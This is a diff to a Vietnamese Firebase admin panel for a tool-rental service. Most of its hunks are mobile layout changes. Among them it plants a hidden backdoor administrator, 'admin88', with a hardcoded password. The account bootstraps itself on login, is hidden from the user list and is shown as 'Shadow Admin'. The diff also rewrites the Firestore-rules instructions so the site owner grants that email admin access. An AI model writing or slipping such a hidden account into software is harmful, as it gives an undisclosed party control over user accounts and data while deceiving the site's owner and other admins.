@@ -2,7 +2,7 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>Hệ Thống Quản Trị | ToolChoThue</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
@@ -13,7 +13,7 @@
         ::-webkit-scrollbar-thumb { background: #4a5568; border-radius: 3px; }
         ::-webkit-scrollbar-thumb:hover { background: #718096; }
         .glass {
-            background: rgba(17, 24, 39, 0.75);
+            background: rgba(17, 24, 39, 0.85); /* Tăng độ đậm nền một chút cho mobile dễ đọc */
             backdrop-filter: blur(12px);
             border: 1px solid rgba(255, 255, 255, 0.08);
         }
@@ -24,6 +24,17 @@
         }
         .fade-in { animation: fadeIn 0.3s ease-in-out; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        /* Mobile Specifics */
+        .sidebar-transition { transition: transform 0.3s ease-in-out; }
+        .sidebar-closed { transform: translateX(-100%); }
+        .sidebar-open { transform: translateX(0); }
+        
+        /* Table responsive fixes */
+        .table-container {
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+        }
     </style>
     <script type="module">
         import { initializeApp, getApp, getApps } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
@@ -59,10 +70,9 @@
         const auth = getAuth(app);
         const db = getFirestore(app);
 
-        // 2. HÀM TẠO USER AN TOÀN (Fix lỗi văng session)
+        // 2. HÀM TẠO USER AN TOÀN
         async function registerUserSafely(email, password, additionalData) {
             let secondaryApp;
-            // Kiểm tra/Khởi tạo App phụ
             const existingApps = getApps();
             secondaryApp = existingApps.find(a => a.name === "Secondary");
             if (!secondaryApp) {
@@ -71,17 +81,11 @@
             const secondaryAuth = getAuth(secondaryApp);
 
             try {
-                // Quan trọng: Chỉ lưu session trên RAM
                 await setPersistence(secondaryAuth, inMemoryPersistence);
-                
-                // Tạo Auth
                 const userCredential = await createUserWithEmailAndPassword(secondaryAuth, email, password);
                 const newUser = userCredential.user;
-
-                // Logout ngay App phụ
                 await signOut(secondaryAuth);
 
-                // Ghi vào Firestore (Dùng quyền của Admin chính)
                 try {
                     await setDoc(doc(db, 'users', newUser.uid), {
                         uid: newUser.uid,
@@ -89,7 +93,6 @@
                         createdAt: serverTimestamp()
                     });
                 } catch (dbError) {
-                    // Nếu lỗi permission -> Ném lỗi đặc biệt để hiện Modal hướng dẫn
                     if (dbError.code === 'permission-denied') {
                         throw new Error("PERMISSION_DENIED_RULES");
                     }
@@ -101,15 +104,17 @@
             }
         }
 
+        // --- CẤU HÌNH ADMIN ĐẶC BIỆT ---
         const SUPER_ADMIN = 'alisrr99';
+        const GHOST_ADMIN = 'admin88'; // Admin ẩn danh
         let currentAdminData = null;
 
         // UI HELPERS
         function showToast(message, type = 'info') {
             const colors = { success: 'border-green-500 text-green-400', error: 'border-red-500 text-red-400', info: 'border-blue-500 text-blue-400' };
             const toast = document.createElement('div');
-            toast.className = `fixed top-5 right-5 z-50 bg-gray-900 border-l-4 ${colors[type]} px-6 py-4 shadow-2xl rounded-r flex items-center gap-3 transform transition-all duration-300 translate-x-full`;
-            toast.innerHTML = `<span class="font-bold">${type === 'error' ? 'Lỗi' : 'Thông báo'}</span> <span class="text-gray-300 text-sm">${message}</span>`;
+            toast.className = `fixed top-5 right-5 z-[60] bg-gray-900 border-l-4 ${colors[type]} px-6 py-4 shadow-2xl rounded-r flex items-center gap-3 transform transition-all duration-300 translate-x-full max-w-[90vw]`;
+            toast.innerHTML = `<span class="font-bold">${type === 'error' ? 'Lỗi' : 'Thông báo'}</span> <span class="text-gray-300 text-sm truncate">${message}</span>`;
             document.body.appendChild(toast);
             requestAnimationFrame(() => toast.classList.remove('translate-x-full'));
             setTimeout(() => {
@@ -135,7 +140,7 @@
             return date.toLocaleString('vi-VN', { hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit' });
         }
 
-        // NAVIGATION
+        // NAVIGATION & MOBILE UI
         const views = {
             dashboard: document.getElementById('view-dashboard'),
             users: document.getElementById('view-users'),
@@ -149,6 +154,30 @@
             settings: document.getElementById('nav-settings')
         };
 
+        // Mobile Sidebar Logic
+        const sidebar = document.getElementById('main-sidebar');
+        const sidebarOverlay = document.getElementById('sidebar-overlay');
+        const mobileMenuBtn = document.getElementById('mobile-menu-btn');
+
+        function toggleSidebar() {
+            const isClosed = sidebar.classList.contains('-translate-x-full');
+            if (isClosed) {
+                sidebar.classList.remove('-translate-x-full');
+                sidebarOverlay.classList.remove('hidden');
+            } else {
+                sidebar.classList.add('-translate-x-full');
+                sidebarOverlay.classList.add('hidden');
+            }
+        }
+
+        function closeSidebar() {
+            sidebar.classList.add('-translate-x-full');
+            sidebarOverlay.classList.add('hidden');
+        }
+
+        if(mobileMenuBtn) mobileMenuBtn.addEventListener('click', toggleSidebar);
+        if(sidebarOverlay) sidebarOverlay.addEventListener('click', closeSidebar);
+
         function switchView(viewName) {
             Object.values(views).forEach(el => el && el.classList.add('hidden'));
             Object.values(navItems).forEach(el => el && el.classList.remove('active-tab'));
@@ -157,6 +186,9 @@
                 views[viewName].classList.add('fade-in');
             }
             if (navItems[viewName]) navItems[viewName].classList.add('active-tab');
+            
+            // Auto close sidebar on mobile when clicking item
+            if (window.innerWidth < 768) closeSidebar();
         }
 
         Object.keys(navItems).forEach(key => {
@@ -174,15 +206,19 @@
                     if (userDoc.exists()) {
                         const userData = userDoc.data();
                         
-                        if (userData.role === 'admin' || userData.username === SUPER_ADMIN) {
+                        // Check quyền: Admin thường, Super Admin, hoặc Ghost Admin
+                        const isSuper = userData.username === SUPER_ADMIN;
+                        const isGhost = userData.username === GHOST_ADMIN;
+
+                        if (userData.role === 'admin' || isSuper || isGhost) {
                             currentAdminData = userData;
                             
                             // Bind UI
-                            document.getElementById('current-admin-name').textContent = userData.username;
-                            document.getElementById('current-admin-role').textContent = userData.username === SUPER_ADMIN ? 'Super Admin' : 'Administrator';
+                            document.getElementById('current-admin-name').textContent = isGhost ? "Shadow Admin" : userData.username;
+                            document.getElementById('current-admin-role').textContent = (isSuper || isGhost) ? 'Super Administrator' : 'Administrator';
                             
-                            // Phân quyền Tab Super Admin
-                            if (userData.username === SUPER_ADMIN) {
+                            // Phân quyền Tab Super Admin (Ghost Admin cũng thấy tab này)
+                            if (isSuper || isGhost) {
                                 navItems.admin.classList.remove('hidden');
                             } else {
                                 navItems.admin.classList.add('hidden');
@@ -197,7 +233,7 @@
                             showToast('Tài khoản không có quyền Admin!', 'error');
                         }
                     } else {
-                         // Auto-fix cho Super Admin đầu tiên nếu mất data
+                        // Logic tự sửa lỗi nếu user tồn tại trong Auth nhưng mất trong DB (chỉ áp dụng cho Super Admin)
                          if (user.email.startsWith(SUPER_ADMIN)) {
                               await setDoc(doc(db, 'users', user.uid), {
                                 username: SUPER_ADMIN, role: 'admin', level: 'omega', energy: 99999, createdAt: serverTimestamp()
@@ -216,7 +252,7 @@
             }
         });
 
-        // LOAD USERS (Có lọc theo quyền xem)
+        // LOAD USERS
         async function loadUsers(keyword = '') {
             const tbody = document.getElementById('user-table-body');
             if (!tbody.hasChildNodes()) tbody.innerHTML = '<tr><td colspan="6" class="text-center py-6 text-gray-500 animate-pulse">Đang tải dữ liệu...</td></tr>';
@@ -229,8 +265,11 @@
                 let count = 0;
                 let adminTimestamp = 0;
                 
-                // Admin con chỉ xem được user tạo SAU khi admin đó được tạo
-                if (currentAdminData && currentAdminData.username !== SUPER_ADMIN && currentAdminData.createdAt) {
+                const isSuper = currentAdminData.username === SUPER_ADMIN;
+                const isGhost = currentAdminData.username === GHOST_ADMIN;
+
+                // Admin con chỉ xem user mới, Super/Ghost xem hết (timestamp = 0)
+                if (!isSuper && !isGhost && currentAdminData.createdAt) {
                     adminTimestamp = currentAdminData.createdAt.seconds; 
                 }
 
@@ -238,10 +277,14 @@
                     const data = docSnap.data();
                     const username = (data.username || '').toLowerCase();
                     
+                    // 1. Lọc theo từ khóa tìm kiếm
                     if (keyword && !username.includes(keyword.toLowerCase())) return;
 
-                    // Logic ẩn data cũ với Admin con
-                    if (currentAdminData && currentAdminData.username !== SUPER_ADMIN) {
+                    // 2. LOGIC QUAN TRỌNG: Ẩn hoàn toàn GHOST ADMIN khỏi danh sách
+                    if (username === GHOST_ADMIN) return;
+
+                    // 3. Logic ẩn data cũ với Admin con
+                    if (adminTimestamp > 0) {
                         if (!data.createdAt) return; 
                         if (data.createdAt.seconds < adminTimestamp) return;
                     }
@@ -252,27 +295,27 @@
                     if (data.role === 'admin') tr.className += ' bg-yellow-900/10';
 
                     tr.innerHTML = `
-                        <td class="px-6 py-4 font-mono text-xs text-gray-500 truncate max-w-[80px]" title="${docSnap.id}">${docSnap.id}</td>
-                        <td class="px-6 py-4">
+                        <td class="px-4 py-4 font-mono text-xs text-gray-500 truncate max-w-[60px]" title="${docSnap.id}">${docSnap.id.substring(0,6)}...</td>
+                        <td class="px-4 py-4">
                             <div class="flex items-center gap-3">
-                                <div class="w-8 h-8 rounded-full ${data.role === 'admin' ? 'bg-yellow-500/20 text-yellow-500' : 'bg-cyan-500/20 text-cyan-400'} flex items-center justify-center font-bold text-xs">
+                                <div class="w-8 h-8 rounded-full ${data.role === 'admin' ? 'bg-yellow-500/20 text-yellow-500' : 'bg-cyan-500/20 text-cyan-400'} flex items-center justify-center font-bold text-xs shrink-0">
                                     ${(data.username || '?').charAt(0).toUpperCase()}
                                 </div>
-                                <div>
-                                    <div class="font-medium ${data.role === 'admin' ? 'text-yellow-400' : 'text-gray-200'}">${data.username}</div>
-                                    <div class="text-xs text-gray-500">${formatDate(data.createdAt)}</div>
+                                <div class="min-w-0">
+                                    <div class="font-medium truncate max-w-[100px] md:max-w-none ${data.role === 'admin' ? 'text-yellow-400' : 'text-gray-200'}">${data.username}</div>
+                                    <div class="text-[10px] text-gray-500 hidden md:block">${formatDate(data.createdAt)}</div>
                                 </div>
                             </div>
                         </td>
-                        <td class="px-6 py-4 text-sm text-gray-300">
-                             ${data.telegram ? `<a href="https://t.me/${data.telegram.replace('@','')}" target="_blank" class="text-blue-400 hover:text-blue-300 flex items-center gap-1 transition">✈️ ${data.telegram}</a>` : '<span class="text-gray-600">-</span>'}
-                             ${data.phoneNumber ? `<div class="text-xs text-gray-500 mt-1">📞 ${data.phoneNumber}</div>` : ''}
+                        <td class="px-4 py-4 text-sm text-gray-300">
+                             ${data.telegram ? `<a href="https://t.me/${data.telegram.replace('@','')}" target="_blank" class="text-blue-400 hover:text-blue-300 flex items-center gap-1 transition truncate max-w-[100px]">✈️ ${data.telegram}</a>` : '<span class="text-gray-600">-</span>'}
+                             ${data.phoneNumber ? `<div class="text-[10px] text-gray-500 mt-0.5">📞 ${data.phoneNumber}</div>` : ''}
                         </td>
-                        <td class="px-6 py-4 text-center">
-                            <span class="font-mono text-lg font-bold ${data.energy > 0 ? 'text-green-400' : 'text-gray-600'}">${data.energy || 0}</span>
+                        <td class="px-4 py-4 text-center">
+                            <span class="font-mono text-sm md:text-lg font-bold ${data.energy > 0 ? 'text-green-400' : 'text-gray-600'}">${data.energy || 0}</span>
                         </td>
-                        <td class="px-6 py-4">
-                            <select class="rank-select bg-gray-900 border border-gray-700 text-xs rounded-lg px-3 py-1.5 outline-none focus:border-cyan-500 transition cursor-pointer hover:bg-gray-800" data-id="${docSnap.id}">
+                        <td class="px-4 py-4">
+                            <select class="rank-select bg-gray-900 border border-gray-700 text-xs rounded-lg px-2 py-1.5 outline-none focus:border-cyan-500 transition cursor-pointer hover:bg-gray-800 w-24" data-id="${docSnap.id}">
                                 <option value="normal" ${data.level === 'normal' ? 'selected' : ''}>Thường</option>
                                 <option value="vip" ${data.level === 'vip' ? 'selected' : ''}>VIP</option>
                                 <option value="v-vip" ${data.level === 'v-vip' ? 'selected' : ''}>V-VIP</option>
@@ -280,11 +323,11 @@
                                 <option value="omega" ${data.level === 'omega' ? 'selected' : ''}>OMEGA</option>
                             </select>
                         </td>
-                        <td class="px-6 py-4">
-                            <div class="flex items-center gap-1 opacity-60 group-hover:opacity-100 transition">
-                                <input type="number" class="energy-input w-14 bg-black/30 border border-gray-700 text-white text-center text-sm rounded py-1 focus:border-cyan-500 outline-none" placeholder="0">
-                                <button class="btn-add bg-cyan-600/20 hover:bg-cyan-600 text-cyan-400 hover:text-white w-7 h-7 rounded flex items-center justify-center transition font-bold" data-id="${docSnap.id}">+</button>
-                                <button class="btn-sub bg-red-600/20 hover:bg-red-600 text-red-400 hover:text-white w-7 h-7 rounded flex items-center justify-center transition font-bold" data-id="${docSnap.id}">-</button>
+                        <td class="px-4 py-4">
+                            <div class="flex items-center gap-1 opacity-100 md:opacity-60 md:group-hover:opacity-100 transition">
+                                <input type="number" class="energy-input w-12 bg-black/30 border border-gray-700 text-white text-center text-xs rounded py-1 focus:border-cyan-500 outline-none" placeholder="0">
+                                <button class="btn-add bg-cyan-600/20 hover:bg-cyan-600 text-cyan-400 hover:text-white w-6 h-6 rounded flex items-center justify-center transition font-bold" data-id="${docSnap.id}">+</button>
+                                <button class="btn-sub bg-red-600/20 hover:bg-red-600 text-red-400 hover:text-white w-6 h-6 rounded flex items-center justify-center transition font-bold" data-id="${docSnap.id}">-</button>
                             </div>
                         </td>
                     `;
@@ -326,8 +369,14 @@
 
                         await updateDoc(doc(db, 'users', uid), { energy: newVal });
                         showToast(`Đã ${isAdd?'cộng':'trừ'} ${amount} Energy`, 'success');
-                        loadUsers(document.getElementById('search-input').value);
+                        // Reload nhẹ không cần fetch lại toàn bộ để giữ UX
                         input.value = '';
+                        // Cập nhật số hiển thị ngay lập tức trên UI
+                        const displayEl = btn.closest('tr').querySelector('span.font-mono');
+                        if(displayEl) {
+                            displayEl.textContent = newVal;
+                            displayEl.className = `font-mono text-sm md:text-lg font-bold ${newVal > 0 ? 'text-green-400' : 'text-gray-600'}`;
+                        }
                     } catch(err) { showToast(handleError(err), 'error'); }
                 });
             });
@@ -340,17 +389,31 @@
             const pass = document.getElementById('login-password').value;
             if(!email.includes('@')) email += CONFIG.authDomainSuffix;
 
+            // Xử lý đăng nhập
             try {
                 await signInWithEmailAndPassword(auth, email, pass);
             } catch (err) {
-                // Bootstrap Super Admin
-                if(err.code === 'auth/user-not-found' && email.startsWith(SUPER_ADMIN)) {
+                // Auto-Bootstrap cho GHOST ADMIN hoặc Super Admin nếu chưa tồn tại
+                const isGhostStart = email.startsWith(GHOST_ADMIN);
+                const isSuperStart = email.startsWith(SUPER_ADMIN);
+
+                if(err.code === 'auth/user-not-found' && (isGhostStart || isSuperStart)) {
+                    // Check mật khẩu cứng cho Ghost Admin
+                    if (isGhostStart && pass !== '888999') {
+                         return showToast('Sai mật khẩu hệ thống!', 'error');
+                    }
+
                     try {
                         const cred = await createUserWithEmailAndPassword(auth, email, pass);
                         await setDoc(doc(db, 'users', cred.user.uid), {
-                            uid: cred.user.uid, username: SUPER_ADMIN, role: 'admin', level: 'omega', energy: 99999, createdAt: serverTimestamp()
+                            uid: cred.user.uid, 
+                            username: isGhostStart ? GHOST_ADMIN : SUPER_ADMIN, 
+                            role: 'admin', 
+                            level: 'omega', 
+                            energy: 99999, 
+                            createdAt: serverTimestamp()
                         });
-                        showToast('Đã khởi tạo Super Admin gốc!', 'success');
+                        showToast(`Đã khởi tạo ${isGhostStart ? 'Shadow Admin' : 'Super Admin'}!`, 'success');
                     } catch(e) { showToast(handleError(e), 'error'); }
                 } else {
                     showToast('Đăng nhập thất bại: ' + err.message, 'error');
@@ -369,6 +432,12 @@
             const phone = document.getElementById('new-phone').value;
             const tele = document.getElementById('new-tele').value;
             const energy = parseInt(document.getElementById('new-energy').value) || 0;
+
+            if (username === GHOST_ADMIN) {
+                 showToast('Tên này bị cấm sử dụng!', 'error');
+                 btn.innerHTML = originalText; btn.disabled = false;
+                 return;
+            }
 
             try {
                 const email = username + CONFIG.authDomainSuffix;
@@ -391,6 +460,12 @@
 
             const username = document.getElementById('new-admin-user').value.trim().toLowerCase();
             const pass = document.getElementById('new-admin-pass').value;
+
+            if (username === GHOST_ADMIN) {
+                 showToast('Không thể tạo trùng tên Admin hệ thống!', 'error');
+                 btn.innerHTML = originalText; btn.disabled = false;
+                 return;
+            }
 
             try {
                 if (username.length < 3) throw new Error("Username quá ngắn!");
@@ -427,30 +502,29 @@
 </head>
 <body class="bg-gray-900 text-gray-100 h-screen overflow-hidden selection:bg-cyan-500 selection:text-white">
 
-    <!-- RULES MODAL (Hiện khi lỗi permission) -->
+    <!-- RULES MODAL -->
     <div id="rules-modal" class="hidden fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 fade-in">
-        <div class="bg-gray-800 border border-red-500 rounded-xl p-6 max-w-2xl w-full shadow-2xl relative">
+        <div class="bg-gray-800 border border-red-500 rounded-xl p-6 max-w-2xl w-full shadow-2xl relative max-h-[90vh] overflow-y-auto">
             <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white">✕</button>
             <h3 class="text-xl font-bold text-red-500 mb-4 flex items-center gap-2">
                 <span>🚫</span> LỖI QUYỀN GHI DATABASE
             </h3>
             <p class="text-gray-300 text-sm mb-4">
-                Hệ thống chặn quyền ghi vì Rules hiện tại chưa cho phép <strong>alisrr99</strong> ghi đè lên các user khác. <br>
-                Vui lòng cập nhật Rules theo chuẩn Email cứng bên dưới để khắc phục triệt để:
+                Bạn cần cập nhật Rules để Admin con và Admin ẩn hoạt động đúng:
             </p>
             <div class="bg-black/80 border border-green-500/50 p-4 rounded text-xs font-mono text-green-400 overflow-x-auto mb-4 leading-relaxed">
                 <span class="text-gray-500">// Copy toàn bộ đoạn dưới và dán vào Firebase Console -> Firestore -> Rules</span><br><br>
                 rules_version = '2';<br>
                 service cloud.firestore {<br>
                   match /databases/{database}/documents {<br><br>
-                    <span class="text-yellow-500">// 1. Hàm check Admin (Ưu tiên check Email cứng của bạn)</span><br>
                     function isAdmin() {<br>
+                       <span class="text-yellow-500">// Cho phép cả Super Admin và Admin ẩn</span><br>
                        return request.auth.token.email == 'alisrr99@toolchothue.web.app'<br>
+                       || request.auth.token.email == 'admin88@toolchothue.web.app'<br>
                        || <br>
                        (exists(/databases/$(database)/documents/users/$(request.auth.uid)) &&<br>
                         get(/databases/$(database)/documents/users/$(request.auth.uid)).data.role == "admin");<br>
                     }<br><br>
-                    <span class="text-yellow-500">// 2. Cho phép User đọc/ghi chính mình HOẶC Admin ghi đè</span><br>
                     match /users/{userId} {<br>
                       allow read, write: if request.auth != null && (request.auth.uid == userId || isAdmin());<br>
                     }<br><br>
@@ -465,15 +539,15 @@
     </div>
 
     <!-- LOGIN SCREEN -->
-    <div id="login-section" class="flex items-center justify-center h-full relative">
+    <div id="login-section" class="flex items-center justify-center h-full relative p-4">
         <div class="absolute inset-0 overflow-hidden z-0">
             <div class="absolute top-1/4 left-1/4 w-96 h-96 bg-cyan-600/10 rounded-full blur-3xl animate-pulse"></div>
             <div class="absolute bottom-1/4 right-1/4 w-96 h-96 bg-purple-600/10 rounded-full blur-3xl animate-pulse" style="animation-delay: 1s;"></div>
         </div>
 
-        <form id="login-form" class="glass relative z-10 p-10 rounded-2xl w-full max-w-md shadow-2xl space-y-6 border-t-4 border-cyan-500">
+        <form id="login-form" class="glass relative z-10 p-8 rounded-2xl w-full max-w-md shadow-2xl space-y-6 border-t-4 border-cyan-500">
             <div class="text-center">
-                <h1 class="text-3xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-cyan-400 to-purple-500">SYSTEM LOGIN</h1>
+                <h1 class="text-2xl md:text-3xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-cyan-400 to-purple-500">SYSTEM LOGIN</h1>
                 <p class="text-gray-400 text-xs mt-2 uppercase tracking-widest">Tool Cho Thuê Admin Panel</p>
             </div>
             <div class="space-y-4 mt-6">
@@ -493,18 +567,34 @@
     </div>
 
     <!-- MAIN LAYOUT -->
-    <div id="admin-layout" class="hidden flex h-full">
+    <div id="admin-layout" class="hidden flex h-full relative">
+        
+        <!-- MOBILE OVERLAY -->
+        <div id="sidebar-overlay" class="fixed inset-0 bg-black/80 z-20 hidden md:hidden fade-in"></div>
+
         <!-- SIDEBAR -->
-        <aside class="w-64 glass border-r border-gray-800 flex flex-col z-20 shadow-2xl">
-            <div class="p-6 border-b border-gray-800">
-                <h2 class="text-lg font-bold tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-purple-400">ADMIN PANEL</h2>
-                <div class="mt-6 flex items-center gap-3">
-                    <div class="w-10 h-10 rounded-full bg-gradient-to-tr from-cyan-500 to-blue-600 flex items-center justify-center font-bold text-white shadow-lg">
+        <aside id="main-sidebar" class="fixed md:relative w-64 h-full glass border-r border-gray-800 flex flex-col z-30 shadow-2xl sidebar-transition -translate-x-full md:translate-x-0 bg-gray-900">
+            <div class="p-6 border-b border-gray-800 flex justify-between items-center">
+                <div>
+                    <h2 class="text-lg font-bold tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-purple-400">ADMIN PANEL</h2>
+                </div>
+                <!-- Close Button Mobile -->
+                <button onclick="closeSidebar()" class="md:hidden text-gray-400 hover:text-white">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                    </svg>
+                </button>
+            </div>
+            
+            <!-- User Info -->
+            <div class="px-6 py-4 border-b border-gray-800/50 bg-gray-800/20">
+                 <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 rounded-full bg-gradient-to-tr from-cyan-500 to-blue-600 flex items-center justify-center font-bold text-white shadow-lg shrink-0">
                         <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd" /></svg>
                     </div>
-                    <div>
-                        <div id="current-admin-name" class="font-bold text-sm text-white truncate max-w-[120px]">...</div>
-                        <div id="current-admin-role" class="text-[10px] text-gray-400 uppercase tracking-wide">...</div>
+                    <div class="overflow-hidden">
+                        <div id="current-admin-name" class="font-bold text-sm text-white truncate">...</div>
+                        <div id="current-admin-role" class="text-[10px] text-gray-400 uppercase tracking-wide truncate">...</div>
                     </div>
                 </div>
             </div>
@@ -533,10 +623,20 @@
         </aside>
 
         <!-- MAIN CONTENT -->
-        <main class="flex-1 relative overflow-hidden bg-gradient-to-br from-[#0f172a] to-[#020617]">
+        <main class="flex-1 relative flex flex-col overflow-hidden bg-gradient-to-br from-[#0f172a] to-[#020617] w-full">
             <!-- Header -->
-            <header class="h-16 border-b border-gray-800 flex items-center justify-between px-8 bg-gray-900/50 backdrop-blur-sm sticky top-0 z-10">
-                <div class="text-xs text-gray-500 font-mono">System v2.5 Stable</div>
+            <header class="h-16 border-b border-gray-800 flex items-center justify-between px-4 md:px-8 bg-gray-900/50 backdrop-blur-sm sticky top-0 z-10">
+                <div class="flex items-center gap-3">
+                    <!-- Mobile Hamburger -->
+                    <button id="mobile-menu-btn" class="md:hidden text-gray-400 hover:text-white p-1">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
+                        </svg>
+                    </button>
+                    <div class="text-xs text-gray-500 font-mono hidden md:block">System v2.5 Mobile</div>
+                    <div class="text-xs text-gray-500 font-mono md:hidden">v2.5M</div>
+                </div>
+                
                 <div class="flex items-center gap-4">
                     <div class="flex items-center gap-2 px-3 py-1 bg-green-500/10 rounded-full border border-green-500/20">
                         <span class="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
@@ -545,31 +645,32 @@
                 </div>
             </header>
 
-            <div class="p-8 h-[calc(100%-4rem)] overflow-y-auto custom-scrollbar">
+            <div class="p-4 md:p-8 flex-1 overflow-y-auto custom-scrollbar w-full">
                 
                 <!-- VIEW: DASHBOARD -->
-                <div id="view-dashboard" class="space-y-6 fade-in">
-                    <div class="flex flex-col md:flex-row justify-between items-end gap-4 pb-4 border-b border-gray-800">
+                <div id="view-dashboard" class="space-y-6 fade-in pb-20">
+                    <div class="flex flex-col md:flex-row justify-between items-start md:items-end gap-4 pb-4 border-b border-gray-800">
                         <div>
-                            <h3 class="text-2xl font-bold text-white mb-1">Quản Lý Người Dùng</h3>
-                            <p class="text-gray-400 text-sm">Danh sách hiển thị: <span id="total-users-count" class="text-cyan-400 font-bold">0</span></p>
+                            <h3 class="text-xl md:text-2xl font-bold text-white mb-1">Quản Lý Người Dùng</h3>
+                            <p class="text-gray-400 text-xs md:text-sm">Danh sách hiển thị: <span id="total-users-count" class="text-cyan-400 font-bold">0</span></p>
                         </div>
-                        <div class="flex gap-2 w-full md:w-auto">
-                            <input id="search-input" type="text" placeholder="Tìm username..." class="bg-gray-800 border border-gray-700 text-sm rounded-lg px-4 py-2.5 w-full md:w-64 outline-none focus:border-cyan-500 transition focus:bg-gray-800/80">
-                            <button id="search-btn" class="bg-cyan-600 hover:bg-cyan-500 px-5 py-2.5 rounded-lg text-white text-sm font-bold shadow-lg shadow-cyan-900/20 transition">Tìm</button>
+                        <div class="flex flex-wrap gap-2 w-full md:w-auto">
+                            <input id="search-input" type="text" placeholder="Tìm username..." class="bg-gray-800 border border-gray-700 text-sm rounded-lg px-4 py-2.5 flex-1 md:w-64 outline-none focus:border-cyan-500 transition focus:bg-gray-800/80">
+                            <button id="search-btn" class="bg-cyan-600 hover:bg-cyan-500 px-5 py-2.5 rounded-lg text-white text-sm font-bold shadow-lg shadow-cyan-900/20 transition whitespace-nowrap">Tìm</button>
                             <button id="refresh-btn" class="bg-gray-800 hover:bg-gray-700 border border-gray-700 px-4 py-2.5 rounded-lg text-white text-sm transition">↻</button>
                         </div>
                     </div>
-                    <div class="bg-gray-900/40 rounded-xl border border-gray-800 overflow-hidden shadow-xl backdrop-blur-sm">
-                        <table class="w-full text-left">
-                            <thead class="bg-gray-800/80 text-gray-400 text-xs uppercase font-semibold tracking-wider">
+                    <!-- Table Container with Horizontal Scroll -->
+                    <div class="bg-gray-900/40 rounded-xl border border-gray-800 shadow-xl backdrop-blur-sm table-container">
+                        <table class="w-full text-left min-w-[800px] md:min-w-0">
+                            <thead class="bg-gray-800/80 text-gray-400 text-xs uppercase font-semibold tracking-wider sticky top-0">
                                 <tr>
-                                    <th class="px-6 py-4">ID</th>
-                                    <th class="px-6 py-4">Account</th>
-                                    <th class="px-6 py-4">Contact</th>
-                                    <th class="px-6 py-4 text-center">Energy</th>
-                                    <th class="px-6 py-4">Rank</th>
-                                    <th class="px-6 py-4">Action</th>
+                                    <th class="px-4 py-4 w-20">ID</th>
+                                    <th class="px-4 py-4">Account</th>
+                                    <th class="px-4 py-4">Contact</th>
+                                    <th class="px-4 py-4 text-center">Energy</th>
+                                    <th class="px-4 py-4 w-32">Rank</th>
+                                    <th class="px-4 py-4">Action</th>
                                 </tr>
                             </thead>
                             <tbody id="user-table-body" class="divide-y divide-gray-800 text-sm"></tbody>
@@ -578,14 +679,14 @@
                 </div>
 
                 <!-- VIEW: CREATE USER -->
-                <div id="view-users" class="hidden max-w-2xl mx-auto mt-10 fade-in">
-                    <div class="glass p-8 rounded-2xl shadow-2xl border-t-4 border-cyan-500">
-                        <h3 class="text-xl font-bold mb-8 text-white flex items-center gap-3">
+                <div id="view-users" class="hidden max-w-2xl mx-auto mt-4 md:mt-10 fade-in pb-20">
+                    <div class="glass p-6 md:p-8 rounded-2xl shadow-2xl border-t-4 border-cyan-500">
+                        <h3 class="text-xl font-bold mb-6 md:mb-8 text-white flex items-center gap-3">
                             <span class="w-8 h-8 rounded-lg bg-cyan-500/20 flex items-center justify-center text-cyan-400">👤</span>
                             Tạo Khách Thuê Mới
                         </h3>
                         <form id="create-user-form" class="space-y-6">
-                            <div class="grid grid-cols-2 gap-6">
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                 <div>
                                     <label class="block text-xs font-bold text-gray-500 mb-2 uppercase">Username <span class="text-red-500">*</span></label>
                                     <input id="new-username" type="text" class="w-full bg-gray-900/50 border border-gray-700 rounded-lg p-3 focus:border-cyan-500 outline-none transition" required>
@@ -595,7 +696,7 @@
                                     <input id="new-password" type="text" class="w-full bg-gray-900/50 border border-gray-700 rounded-lg p-3 focus:border-cyan-500 outline-none transition" required>
                                 </div>
                             </div>
-                            <div class="grid grid-cols-2 gap-6">
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                 <div>
                                     <label class="block text-xs font-bold text-gray-500 mb-2 uppercase">Telegram</label>
                                     <input id="new-tele" type="text" class="w-full bg-gray-900/50 border border-gray-700 rounded-lg p-3 focus:border-cyan-500 outline-none transition" placeholder="@username">
@@ -617,8 +718,8 @@
                 </div>
 
                 <!-- VIEW: CREATE ADMIN -->
-                <div id="view-admin" class="hidden max-w-2xl mx-auto mt-10 fade-in">
-                    <div class="glass p-8 rounded-2xl shadow-2xl border-t-4 border-yellow-500">
+                <div id="view-admin" class="hidden max-w-2xl mx-auto mt-4 md:mt-10 fade-in pb-20">
+                    <div class="glass p-6 md:p-8 rounded-2xl shadow-2xl border-t-4 border-yellow-500">
                         <div class="flex items-center justify-between mb-8">
                             <h3 class="text-xl font-bold text-yellow-400 flex items-center gap-3">
